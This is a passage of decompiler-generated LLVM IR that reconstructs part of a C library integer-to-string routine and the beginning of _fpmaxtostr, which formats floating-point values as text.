  br i1 %v1_805175d, label %dec_label_pc_805177e, label %dec_label_pc_805175f

dec_label_pc_805175f:                             ; preds = %entry
  %v1_805175f = sub i32 0, %arg4
  store i32 %v1_805175f, i32* %esi.global-to-local, align 4
  %v2_8051761 = icmp slt i32 %arg3, 0
  %v1_8051763 = icmp eq i1 %v2_8051761, false
  br i1 %v1_8051763, label %dec_label_pc_805177e, label %dec_label_pc_8051765

dec_label_pc_8051765:                             ; preds = %dec_label_pc_805175f
  %v1_8051765 = sub i32 0, %arg2
  %v5_8051765 = icmp ne i32 %arg2, 0
  store i32 %v1_8051765, i32* %ecx.global-to-local, align 4
  %v2_8051767 = zext i1 %v5_8051765 to i32
  %v3_8051767 = add i32 %v2_8051767, %arg3
  %v1_8051772 = sub i32 0, %v3_8051767
  store i32 %v1_8051772, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805177e

dec_label_pc_805177e:                             ; preds = %entry, %dec_label_pc_805175f, %dec_label_pc_8051765
  %v0_8051783 = phi i32 [ %v1_805175f, %dec_label_pc_8051765 ], [ %v1_805175f, %dec_label_pc_805175f ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8051765 ], [ 0, %dec_label_pc_805175f ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8051783
  %tmp35 = urem i32 -1, %v0_8051783
  %v1_8051785 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8051789 = load i32, i32* %esi.global-to-local, align 4
  %v12_8051789 = icmp eq i32 %v1_8051785, %v1_8051789
  %v1_8051793 = icmp eq i1 %v12_8051789, false
  br i1 %v1_8051793, label %dec_label_pc_80517a2, label %dec_label_pc_8051795

dec_label_pc_8051795:                             ; preds = %dec_label_pc_805177e
  %v1_8051795 = add i32 %div, 1
  br label %dec_label_pc_80517a2

dec_label_pc_80517a2:                             ; preds = %dec_label_pc_805177e, %dec_label_pc_8051795
  %stack_var_-20.0.off0 = phi i32 [ %v1_8051785, %dec_label_pc_805177e ], [ 0, %dec_label_pc_8051795 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_805177e ], [ %v1_8051795, %dec_label_pc_8051795 ]
  %v0_80517a2 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80517a2, i32* %ebp.global-to-local, align 4
  %v0_80517a4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80517a4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80517aa

dec_label_pc_80517aa:                             ; preds = %dec_label_pc_80517e9, %dec_label_pc_80517a2
  %v0_80517e1 = phi i32 [ %v0_80517fa, %dec_label_pc_80517e9 ], [ %v0_80517a2, %dec_label_pc_80517a2 ]
  %v0_80517ae = phi i32 [ %v1_80517fc, %dec_label_pc_80517e9 ], [ %v0_80517a4, %dec_label_pc_80517a2 ]
  %v1_80517aa = icmp eq i32 %v0_80517ae, 0
  br i1 %v1_80517aa, label %dec_label_pc_80517e1, label %dec_label_pc_80517ae

dec_label_pc_80517ae:                             ; preds = %dec_label_pc_80517aa
  %v0_80517b2 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_80517ae, %v0_80517b2
  %tmp36 = urem i32 %v0_80517ae, %v0_80517b2
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_80517e1, %v0_80517b2
  %tmp37 = urem i32 %v0_80517e1, %v0_80517b2
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_80517c5 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_80517c9 = add i32 %tmp37, %v6_80517c5
  %v8_80517cf = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_80517d4 = add i32 %div8, %v8_80517cf
  store i32 %v2_80517d4, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_80517c9, %v0_80517b2
  %tmp38 = urem i32 %v2_80517c9, %v0_80517b2
  %v2_80517dc = add i32 %div9, %v2_80517d4
  br label %dec_label_pc_80517e9

dec_label_pc_80517e1:                             ; preds = %dec_label_pc_80517aa
  %v0_80517e5 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_80517e1, %v0_80517e5
  %tmp39 = urem i32 %v0_80517e1, %v0_80517e5
  br label %dec_label_pc_80517e9

dec_label_pc_80517e9:                             ; preds = %dec_label_pc_80517ae, %dec_label_pc_80517e1
  %v0_80517ef = phi i32 [ %tmp38, %dec_label_pc_80517ae ], [ %tmp39, %dec_label_pc_80517e1 ]
  %storemerge = phi i32 [ %v2_80517dc, %dec_label_pc_80517ae ], [ %div12, %dec_label_pc_80517e1 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_80517e9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80517e9 = add i32 %v0_80517e9, -1
  store i32 %v1_80517e9, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_80517ef, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_80517ef
  %v8_80517ef = trunc i32 %storemerge14.in to i8
  %v3_80517f8 = inttoptr i32 %v1_80517e9 to i8*
  store i8 %v8_80517ef, i8* %v3_80517f8, align 1
  %v0_80517fa = load i32, i32* %ebp.global-to-local, align 4
  %v1_80517fc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80517fc = or i32 %v1_80517fc, %v0_80517fa
  %v3_80517fc = icmp eq i32 %v2_80517fc, 0
  %v1_80517fe = icmp eq i1 %v3_80517fc, false
  br i1 %v1_80517fe, label %dec_label_pc_80517aa, label %dec_label_pc_8051800

dec_label_pc_8051800:                             ; preds = %dec_label_pc_80517e9
  %v4_8051800 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8051800, label %dec_label_pc_805180b, label %dec_label_pc_8051807

dec_label_pc_8051807:                             ; preds = %dec_label_pc_8051800
  %v0_8051807 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051807 = add i32 %v0_8051807, -1
  store i32 %v1_8051807, i32* %edi.global-to-local, align 4
  %v1_8051808 = inttoptr i32 %v1_8051807 to i8*
  store i8 45, i8* %v1_8051808, align 1
  br label %dec_label_pc_805180b

dec_label_pc_805180b:                             ; preds = %dec_label_pc_8051800, %dec_label_pc_8051807
  %v0_805180e = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_805180e

; uselistorder directives
  uselistorder i32 %v2_80517c9, { 1, 0 }
  uselistorder i32 %v0_80517b2, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_80517ae, { 1, 0, 2 }
  uselistorder i32 %v0_80517e1, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051783, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805180b, { 1, 0 }
  uselistorder label %dec_label_pc_80517e9, { 1, 0 }
  uselistorder label %dec_label_pc_80517a2, { 1, 0 }
  uselistorder label %dec_label_pc_805177e, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_4()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051819 = load i32, i32* @edi, align 4
  %v0_805181a = load i32, i32* @esi, align 4
  %v0_805181b = load i32, i32* @ebx, align 4
  store i32 %v0_805181b, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_8051830 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8051830 = add i3 %v4_8051830, -1
  store i3 %v5_8051830, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8051837 = add i32 %tmp112, 4
  %v2_8051837 = inttoptr i32 %v1_8051837 to i32*
  %v3_8051837 = load i32, i32* %v2_8051837, align 4
  store i32 %v3_8051837, i32* %eax.global-to-local, align 4
  %v1_805183e = add i32 %tmp112, 8
  %v2_805183e = inttoptr i32 %v1_805183e to i8*
  %v3_805183e = load i8, i8* %v2_805183e, align 1
  %v4_805183e = zext i8 %v3_805183e to i32
  %v5_805183e = load i32, i32* @ecx, align 4
  %v6_805183e = and i32 %v5_805183e, -256
  %v7_805183e = or i32 %v6_805183e, %v4_805183e
  store i32 %v7_805183e, i32* %ecx.global-to-local, align 4
  %v1_8051841 = inttoptr i32 %tmp112 to i32*
  %v2_8051841 = load i32, i32* %v1_8051841, align 4
  store i32 %v2_8051841, i32* %ebp.global-to-local, align 4
  %v3_8051843 = and i32 %v3_8051837, -256
  %v4_8051843 = or i32 %v3_8051843, %v4_805183e
  %v1_8051849 = or i32 %v4_8051843, 32
  %v3_8051849 = trunc i32 %v1_8051849 to i8
  store i32 %v1_8051849, i32* %eax.global-to-local, align 4
  %v10_8051854 = icmp eq i8 %v3_8051849, 97
  %v1_8051856 = icmp eq i1 %v10_8051854, false
  br i1 %v1_8051856, label %dec_label_pc_805185f, label %dec_label_pc_8051858

dec_label_pc_8051858:                             ; preds = %entry
  %v1_8051858 = add i32 %v7_805183e, 6
  %v11_8051858 = trunc i32 %v1_8051858 to i8
  store i32 %v1_8051858, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805185f

dec_label_pc_805185f:                             ; preds = %entry, %dec_label_pc_8051858
  %stack_var_-206.0 = phi i8 [ %v3_805183e, %entry ], [ %v11_8051858, %dec_label_pc_8051858 ]
  %v2_805185f = icmp slt i32 %v2_8051841, 0
  %v1_8051861 = icmp eq i1 %v2_805185f, false
  br i1 %v1_8051861, label %dec_label_pc_8051868, label %dec_label_pc_8051863

dec_label_pc_8051863:                             ; preds = %dec_label_pc_805185f
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051868

dec_label_pc_8051868:                             ; preds = %dec_label_pc_805185f, %dec_label_pc_8051863
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8051877 = add i32 %tmp112, 12
  %v2_8051877 = inttoptr i32 %v1_8051877 to i32*
  %v3_8051877 = load i32, i32* %v2_8051877, align 4
  store i32 %v3_8051877, i32* %eax.global-to-local, align 4
  %v2_805187a = and i32 %v3_8051877, 2
  %v3_805187a = icmp eq i32 %v2_805187a, 0
  br i1 %v3_805187a, label %dec_label_pc_8051888, label %dec_label_pc_8051894

dec_label_pc_8051888:                             ; preds = %dec_label_pc_8051868
  %v2_8051888 = urem i32 %v3_8051877, 2
  %tmp143 = trunc i32 %v2_8051888 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8051894

dec_label_pc_8051894:                             ; preds = %dec_label_pc_8051888, %dec_label_pc_8051868
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8051868 ], [ %tmp144, %dec_label_pc_8051888 ]
  %v1_80518a8 = udiv i32 %v3_8051877, 256
  %tmp146 = and i32 %v1_80518a8, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_80519fa, label %dec_label_pc_805191a

dec_label_pc_805191a:                             ; preds = %dec_label_pc_8051894
  store i3 %v4_8051830, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8051921 = add i32 %tmp112, 16
  %v2_8051921 = inttoptr i32 %v1_8051921 to i32*
  store i32 32, i32* %v2_8051921, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_8051938 = add i8 %stack_var_-206.0, -96
  %v6_8051938 = sub i8 95, %stack_var_-206.0
  %v7_8051938 = and i8 %v6_8051938, %stack_var_-206.0
  %v8_8051938 = icmp slt i8 %v7_8051938, 0
  %v9_8051938 = icmp eq i8 %v4_8051938, 0
  %v10_8051938 = icmp slt i8 %v4_8051938, 0
  %v3_805193d = icmp eq i1 %v10_8051938, %v8_8051938
  %v4_805193d = icmp eq i1 %v9_8051938, false
  %v5_805193d = and i1 %v4_805193d, %v3_805193d
  br i1 %v5_805193d, label %dec_label_pc_8051944, label %dec_label_pc_805193f

dec_label_pc_805193f:                             ; preds = %dec_label_pc_805191a
  br label %dec_label_pc_8051944

dec_label_pc_8051944:                             ; preds = %dec_label_pc_805191a, %dec_label_pc_805193f
  %v2_805194c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805194c, i32* @ecx, align 4
  br label %dec_label_pc_8051d1f

dec_label_pc_80519fa:                             ; preds = %dec_label_pc_8051894
  %v1_80518b9 = add i3 %v4_8051830, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_80519fe = and i32 %v3_8051877, -65536
  %v2_8051a03 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_8051a03, i32* %edx.global-to-local, align 4
  %v1_8051a0a = udiv i16 %tmp103, 256
  %v2_8051a0a = zext i16 %v1_8051a0a to i32
  %v3_8051a0a = mul nuw nsw i32 %v2_8051a0a, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_80519fe.masked = zext i16 %tmp148 to i32
  %v11_8051a0a = or i32 %v4_80519fe.masked, %v3_8051a0a
  %v10_8051a0a = or i32 %v11_8051a0a, %v6_80519fe
  %v12_8051a0a = or i32 %v10_8051a0a, 3072
  store i32 %v12_8051a0a, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_80518b9, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8051a1e

dec_label_pc_8051a1e:                             ; preds = %dec_label_pc_8051a6f.dec_label_pc_8051a1e_crit_edge, %dec_label_pc_80519fa
  %v2_8051a3b = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_80519fa ], [ %v2_8051a3b.pre, %dec_label_pc_8051a6f.dec_label_pc_8051a1e_crit_edge ]
  %v1_8051a1e = phi i3 [ %v1_80518b9, %dec_label_pc_80519fa ], [ %v1_8051a1e.pre, %dec_label_pc_8051a6f.dec_label_pc_8051a1e_crit_edge ]
  %v3_8051a45 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_80519fa ], [ %v0_8051a1e.pre, %dec_label_pc_8051a6f.dec_label_pc_8051a1e_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8051a03, %dec_label_pc_80519fa ], [ %v4_8051a40, %dec_label_pc_8051a6f.dec_label_pc_8051a1e_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_8051a45 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_8051a38 = sitofp i32 %tmp149 to x86_fp80
  %v4_8051a3b = fsub x86_fp80 %v2_8051a3b, %v5_8051a38
  store i3 %v1_8051a1e, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8051a40 = add i32 %stack_var_-212.0, 9
  %v4_8051a45 = fmul x86_fp80 %v3_8051a45, %v4_8051a3b
  store x86_fp80 %v4_8051a45, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8051a47

dec_label_pc_8051a47:                             ; preds = %dec_label_pc_8051a47.dec_label_pc_8051a47_crit_edge, %dec_label_pc_8051a1e
  %v0_8051a59 = phi i32 [ %v0_8051a59.pre, %dec_label_pc_8051a47.dec_label_pc_8051a47_crit_edge ], [ %tmp149, %dec_label_pc_8051a1e ]
  %v0_8051a47 = phi i32 [ %v0_8051a47.pre, %dec_label_pc_8051a47.dec_label_pc_8051a47_crit_edge ], [ 0, %dec_label_pc_8051a1e ]
  %v1_8051a47 = add i32 %v0_8051a47, 1
  store i32 %v1_8051a47, i32* %esi.global-to-local, align 4
  %v2_8051a4c = sub i32 %v4_8051a40, %v1_8051a47
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_8051a59, 10
  %tmp136 = urem i32 %v0_8051a59, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8051a4c, i32* %eax.global-to-local, align 4
  %v1_8051a65 = or i32 %tmp136, 48
  %v8_8051a65 = trunc i32 %v1_8051a65 to i8
  store i32 %v1_8051a65, i32* %edx.global-to-local, align 4
  %v3_8051a6b = inttoptr i32 %v2_8051a4c to i8*
  store i8 %v8_8051a65, i8* %v3_8051a6b, align 1
  %v7_8051a6d = icmp sgt i32 %v1_8051a47, 8
  br i1 %v7_8051a6d, label %dec_label_pc_8051a6f, label %dec_label_pc_8051a47.dec_label_pc_8051a47_crit_edge

dec_label_pc_8051a47.dec_label_pc_8051a47_crit_edge: ; preds = %dec_label_pc_8051a47
  %v0_8051a47.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8051a59.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a47

dec_label_pc_8051a6f:                             ; preds = %dec_label_pc_8051a47
  %v0_8051a6f = load i32, i32* @edi, align 4
  %v1_8051a6f = add i32 %v0_8051a6f, 1
  store i32 %v1_8051a6f, i32* @edi, align 4
  %v7_8051a73 = icmp sgt i32 %v1_8051a6f, 2
  br i1 %v7_8051a73, label %dec_label_pc_8051a75, label %dec_label_pc_8051a6f.dec_label_pc_8051a1e_crit_edge

dec_label_pc_8051a6f.dec_label_pc_8051a1e_crit_edge: ; preds = %dec_label_pc_8051a6f
  %v0_8051a1e.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8051a1e.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8051a3b.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8051a1e

dec_label_pc_8051a75:                             ; preds = %dec_label_pc_8051a6f
  %v0_8051a75 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8051a75 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8051a75, x86_fp80* %st0.global-to-local, align 4
  %v2_8051a77 = add i3 %v0_8051a75, 2
  store i3 %v2_8051a77, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8051a79 = add i8 %stack_var_-206.0, -96
  %v6_8051a79 = sub i8 95, %stack_var_-206.0
  %v7_8051a79 = and i8 %v6_8051a79, %stack_var_-206.0
  %v8_8051a79 = icmp slt i8 %v7_8051a79, 0
  %v9_8051a79 = icmp eq i8 %v4_8051a79, 0
  %v10_8051a79 = icmp slt i8 %v4_8051a79, 0
  %v3_8051a7e = icmp eq i1 %v10_8051a79, %v8_8051a79
  %v4_8051a7e = icmp eq i1 %v9_8051a79, false
  %v5_8051a7e = and i1 %v4_8051a7e, %v3_8051a7e
  br i1 %v5_8051a7e, label %dec_label_pc_8051a8d, label %dec_label_pc_8051a80

dec_label_pc_8051a80:                             ; preds = %dec_label_pc_8051a75
  %v4_8051a80 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_8051a8d

dec_label_pc_8051a8d:                             ; preds = %dec_label_pc_8051a75, %dec_label_pc_8051a80
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_8051a75 ], [ %v4_8051a80, %dec_label_pc_8051a80 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8051a75 ], [ 69, %dec_label_pc_8051a80 ]
  %v12_8051a8d = icmp eq i8 %stack_var_-206.1, 103
  %v1_8051a92 = icmp eq i1 %v12_8051a8d, false
  br i1 %v1_8051a92, label %dec_label_pc_8051a9b, label %dec_label_pc_8051a94

dec_label_pc_8051a94:                             ; preds = %dec_label_pc_8051a8d
  %v0_8051a94 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_8051a94, 1
  br i1 %tmp137, label %dec_label_pc_8051aa2, label %dec_label_pc_8051a98

dec_label_pc_8051a98:                             ; preds = %dec_label_pc_8051a94
  %v1_8051a98 = add i32 %v0_8051a94, -1
  store i32 %v1_8051a98, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051aa2

dec_label_pc_8051a9b:                             ; preds = %dec_label_pc_8051a8d
  %v12_8051a9b = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8051a9b, label %dec_label_pc_8051aa6, label %dec_label_pc_8051a9b.dec_label_pc_8051aa2_crit_edge

dec_label_pc_8051a9b.dec_label_pc_8051aa2_crit_edge: ; preds = %dec_label_pc_8051a9b
  %v0_8051aa2.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051aa2

dec_label_pc_8051aa2:                             ; preds = %dec_label_pc_8051a9b.dec_label_pc_8051aa2_crit_edge, %dec_label_pc_8051a94, %dec_label_pc_8051a98
  %v0_8051aa2 = phi i32 [ %v0_8051aa2.pre, %dec_label_pc_8051a9b.dec_label_pc_8051aa2_crit_edge ], [ %v0_8051a94, %dec_label_pc_8051a94 ], [ %v1_8051a98, %dec_label_pc_8051a98 ]
  store i32 %v0_8051aa2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ad3

dec_label_pc_8051aa6:                             ; preds = %dec_label_pc_8051a9b
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8051aaa = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051aaa = add i32 %v0_8051aaa, -1
  store i32 %v2_8051aaa, i32* %ebx.global-to-local, align 4
  %v5_8051ab1 = icmp slt i32 %v2_8051aaa, -1
  br i1 %v5_8051ab1, label %dec_label_pc_8051ab3, label %dec_label_pc_8051ad3

dec_label_pc_8051ab3:                             ; preds = %dec_label_pc_8051aa6
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051abb = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8051abb, i32* %eax.global-to-local, align 4
  %v4_8051ac3 = bitcast i32* %stack_var_-72 to i8*
  %v5_8051ac3 = call i32 @__GI_memset(i8* %v4_8051ac3, i32 48, i32 21)
  store i32 %v5_8051ac3, i32* %eax.global-to-local, align 4
  %v0_8051ae3.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ad3

dec_label_pc_8051ad3:                             ; preds = %dec_label_pc_8051aa6, %dec_label_pc_8051ab3, %dec_label_pc_8051aa2
  %v1_8051af3 = phi i32 [ %v0_8051aa2, %dec_label_pc_8051aa2 ], [ %v0_8051ae3.pr.pre, %dec_label_pc_8051ab3 ], [ %v2_8051aaa, %dec_label_pc_8051aa6 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8051ae6 = icmp sgt i32 %v1_8051af3, 20
  br i1 %v7_8051ae6, label %dec_label_pc_8051ae8, label %dec_label_pc_8051af3

dec_label_pc_8051ae8:                             ; preds = %dec_label_pc_8051ad3
  %v2_8051ae8 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8051ae8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051b07.preheader

dec_label_pc_8051af3:                             ; preds = %dec_label_pc_8051ad3
  %v0_8051af3 = load i32, i32* @esp, align 4
  %v2_8051af3 = add i32 %v1_8051af3, 165
  %v3_8051af3 = add i32 %v2_8051af3, %v0_8051af3
  store i32 %v3_8051af3, i32* %eax.global-to-local, align 4
  %v1_8051afa = add i32 %v3_8051af3, 2
  store i32 %v1_8051afa, i32* %ecx.global-to-local, align 4
  %v2_8051afd = inttoptr i32 %v1_8051afa to i8*
  %v3_8051afd = load i8, i8* %v2_8051afd, align 1
  %v4_8051afd = add i8 %v3_8051afd, -53
  %v9_8051afd = sub i8 52, %v3_8051afd
  %v10_8051afd = and i8 %v9_8051afd, %v3_8051afd
  %v11_8051afd = icmp slt i8 %v10_8051afd, 0
  %v13_8051afd = icmp slt i8 %v4_8051afd, 0
  %v2_8051b01 = icmp eq i1 %v13_8051afd, %v11_8051afd
  %v3_8051b01 = zext i1 %v2_8051b01 to i32
  br label %dec_label_pc_8051b07.preheader

dec_label_pc_8051b07.preheader:                   ; preds = %dec_label_pc_8051af3, %dec_label_pc_8051ae8
  %v0_8051b0763 = phi i32 [ %v1_8051afa, %dec_label_pc_8051af3 ], [ %v2_8051ae8, %dec_label_pc_8051ae8 ]
  %storemerge52 = phi i32 [ %v3_8051b01, %dec_label_pc_8051af3 ], [ 0, %dec_label_pc_8051ae8 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b07

dec_label_pc_8051b07:                             ; preds = %dec_label_pc_8051b07.backedge, %dec_label_pc_8051b07.preheader
  %v3_8051b08 = phi i32 [ %v3_8051b08.pre, %dec_label_pc_8051b07.backedge ], [ %storemerge52, %dec_label_pc_8051b07.preheader ]
  %v0_8051b07 = phi i32 [ %v0_8051b0a, %dec_label_pc_8051b07.backedge ], [ %v0_8051b0763, %dec_label_pc_8051b07.preheader ]
  %v1_8051b07 = add i32 %v0_8051b07, -1
  store i32 %v1_8051b07, i32* %ecx.global-to-local, align 4
  %v1_8051b08 = inttoptr i32 %v1_8051b07 to i8*
  %v2_8051b08 = load i8, i8* %v1_8051b08, align 1
  %v4_8051b08 = trunc i32 %v3_8051b08 to i8
  %v5_8051b08 = add i8 %v2_8051b08, %v4_8051b08
  store i8 %v5_8051b08, i8* %v1_8051b08, align 1
  %v0_8051b0a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051b0a = inttoptr i32 %v0_8051b0a to i8*
  %v2_8051b0a = load i8, i8* %v1_8051b0a, align 1
  %v3_8051b0a = zext i8 %v2_8051b0a to i32
  %v4_8051b0a = load i32, i32* %edx.global-to-local, align 4
  %v5_8051b0a = and i32 %v4_8051b0a, -256
  %v6_8051b0a = or i32 %v5_8051b0a, %v3_8051b0a
  store i32 %v6_8051b0a, i32* %edx.global-to-local, align 4
  %v7_8051b0c = icmp eq i8 %v2_8051b0a, 48
  br i1 %v7_8051b0c, label %dec_label_pc_8051b07.backedge, label %dec_label_pc_8051b11

dec_label_pc_8051b07.backedge:                    ; preds = %dec_label_pc_8051b07, %dec_label_pc_8051b11
  %v3_8051b08.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b07

dec_label_pc_8051b11:                             ; preds = %dec_label_pc_8051b07
  %v2_8051b11 = add i8 %v2_8051b0a, -57
  %v7_8051b11 = sub i8 56, %v2_8051b0a
  %v8_8051b11 = and i8 %v7_8051b11, %v2_8051b0a
  %v9_8051b11 = icmp slt i8 %v8_8051b11, 0
  %v10_8051b11 = icmp eq i8 %v2_8051b11, 0
  %v11_8051b11 = icmp slt i8 %v2_8051b11, 0
  %v3_8051b14 = icmp eq i1 %v11_8051b11, %v9_8051b11
  %v4_8051b14 = icmp eq i1 %v10_8051b11, false
  %v5_8051b14 = and i1 %v4_8051b14, %v3_8051b14
  br i1 %v5_8051b14, label %dec_label_pc_8051b07.backedge, label %dec_label_pc_8051b16

dec_label_pc_8051b16:                             ; preds = %dec_label_pc_8051b11
  %v2_8051b16 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8051b16, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_8051b0a, %v2_8051b16
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_8051b21, label %dec_label_pc_8051b2e

dec_label_pc_8051b21:                             ; preds = %dec_label_pc_8051b16
  store i32 %v2_8051a03, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051b37

dec_label_pc_8051b2e:                             ; preds = %dec_label_pc_8051b16
  store i32 %v2_8051b16, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8051b16, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051b37

dec_label_pc_8051b37:                             ; preds = %dec_label_pc_8051b21, %dec_label_pc_8051b2e
  %v0_8051b37 = phi i32 [ %v0_8051b0a, %dec_label_pc_8051b21 ], [ %v2_8051b16, %dec_label_pc_8051b2e ]
  %v1_8051b37 = add i32 %v0_8051b37, 1
  store i32 %v1_8051b37, i32* %eax.global-to-local, align 4
  %v2_8051b3e = inttoptr i32 %v1_8051b37 to i8*
  store i8 0, i8* %v2_8051b3e, align 1
  br i1 %v1_8051a92, label %dec_label_pc_8051b64, label %dec_label_pc_8051b49

dec_label_pc_8051b49:                             ; preds = %dec_label_pc_8051b37
  %v0_8051b49 = load i32, i32* %esi.global-to-local, align 4
